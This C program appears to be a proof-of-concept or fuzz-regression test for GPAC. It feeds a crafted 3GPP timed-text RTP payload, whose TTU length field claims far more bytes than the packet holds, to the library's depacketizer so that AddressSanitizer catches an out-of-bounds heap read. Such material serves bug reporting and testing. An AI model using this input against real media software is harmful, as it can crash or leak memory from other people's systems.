#include <gpac/ietf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Builds an SDP describing a 3GPP timed text stream and feeds one crafted
 * RTP payload to the depacketizer through the public API. */
static const char *sdp_text =
	"v=0\n"
	"o=- 0 0 IN IP4 127.0.0.1\n"
	"s=ttxt\n"
	"m=text 4000 RTP/AVP 96\n"
	"a=rtpmap:96 3gpp-tt/1000\n"
	"a=fmtp:96 tx3g=AAAA\n";

static void on_sl_packet(void *udta, u8 *payload, u32 size, GF_SLHeader *hdr, GF_Err e)
{
	(void) udta; (void) payload; (void) size; (void) hdr; (void) e;
}

int main(void)
{
	GF_SDPInfo *sdp;
	GF_SDPMedia *media;
	GF_RTPDepacketizer *rtpd;
	GF_RTPHeader hdr;
	/* type=4 modifier TTU announcing 257 bytes while the packet only
	 * carries the 7-byte header plus a single modifier byte. */
	u8 payload[8] = {
		0x04,             /* U=0, reserved, TYPE=4 */
		0x01, 0x00,       /* TTU length = 256 */
		0x11,             /* LEN=1, FT=1 */
		0x00, 0x00, 0x0a, /* duration */
		0x5a              /* modifier byte */
	};
	u8 *buf;

	if (gf_sys_init(GF_MemTrackerNone, NULL) != GF_OK) return 1;

	sdp = gf_sdp_info_new();
	if (!sdp) return 1;
	if (gf_sdp_info_parse(sdp, (char *) sdp_text, (u32) strlen(sdp_text)) != GF_OK) {
		gf_sdp_info_del(sdp);
		return 1;
	}
	media = (GF_SDPMedia *) gf_list_get(sdp->media_desc, 0);
	rtpd = gf_rtp_depacketizer_new(media, 0, on_sl_packet, NULL);
	gf_sdp_info_del(sdp);
	if (!rtpd) {
		fprintf(stderr, "failed to create 3gpp-tt depacketizer\n");
		return 1;
	}

	/* exact-size heap buffer so that ASan can see any read past the end */
	buf = (u8 *) malloc(sizeof(payload));
	memcpy(buf, payload, sizeof(payload));

	memset(&hdr, 0, sizeof(hdr));
	hdr.Version = 2;
	hdr.Marker = 1;
	hdr.PayloadType = 96;
	hdr.SequenceNumber = 1;
	hdr.TimeStamp = 1000;
	hdr.SSRC = 0x12345678;

	gf_rtp_depacketizer_process(rtpd, &hdr, buf, sizeof(payload));

	free(buf);
	gf_rtp_depacketizer_del(rtpd);
	gf_sys_close();
	return 0;
}
